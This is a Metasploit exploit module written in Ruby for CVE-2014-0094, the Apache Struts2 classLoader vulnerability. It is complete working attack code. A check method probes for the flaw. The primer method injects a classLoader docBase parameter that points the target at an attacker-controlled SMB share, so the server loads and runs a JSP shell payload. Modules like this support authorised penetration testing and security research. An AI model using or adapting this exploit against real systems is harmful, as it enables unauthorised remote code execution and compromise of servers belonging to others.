##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::SMB::Server::Share

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Struts JSP Injection Over HTTP',
      'Description'   => %q{
        This module exploits the classLoader Apache Struts2 vulnerability
        to inject a JSP shell over SMB.
      },
      'Author'      =>
        [
          'Matthew Hall <hallm@sec-1.com>'
        ],
      'DisclosureDate' => 'May 1 2014',
      'References'     =>
        [
          ['CVE', '2014-0094']
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Payload'        =>
        {
          'Space'       => 2048,
          'DisableNops' => true
        },
      'Privileged'     => true,
      'Arch'           => ARCH_JAVA,
      'Platform'       => 'win',
      'Stance'         => Msf::Exploit::Stance::Aggressive,
      'Targets'        =>
        [
          ['Java Universal', {}]
        ],
      'DefaultTarget'  => 0,
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to vulnerable Struts action file', '/struts2-blank/example/HelloWorld.action']),
        OptString.new('FILE_NAME', [ true, 'A static JSP name', 'HelloWorld.jsp']),
        OptString.new('FOLDER_NAME', [ true, 'A static Folder', 'example']),
        OptString.new('SHARE', [ true, 'Share', 'share']),
        OptInt.new('SMB_DELAY', [true, 'Time that the SMB Server will wait for the payload request', 10]),
        Opt::RPORT(8080)
      ], self.class)

    deregister_options('FILE_CONTENTS')
  end

  def check
    uri = datastore['URI'] + '?Class.classLoader.resources.dirContext.cacheObjectMaxSize=x'
    res = send_request_raw({'uri'=>uri})

    if res and res.body =~ /No result defined for action/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Unknown
    end
  end

  def primer
    self.file_contents = payload.encoded
    print_status("File available on #{unc}...")

    sploit = target_uri.to_s
    sploit << '?Class.classLoader.resources.dirContext.docBase='
    sploit << "\\\\#{srvhost}\\#{share}"
    print_status("Injecting JSP to #{datastore['RHOST']}:#{datastore['RPORT']} - #{sploit}")

    send_request_raw({
      'method' => 'GET',
      'uri' => sploit
    }, 30)
  end

  def exploit
    begin
      Timeout.timeout(datastore['SMB_DELAY']) {super}
    rescue Timeout::Error
      # do nothing... just finish exploit and stop smb server...
    end
  end
end
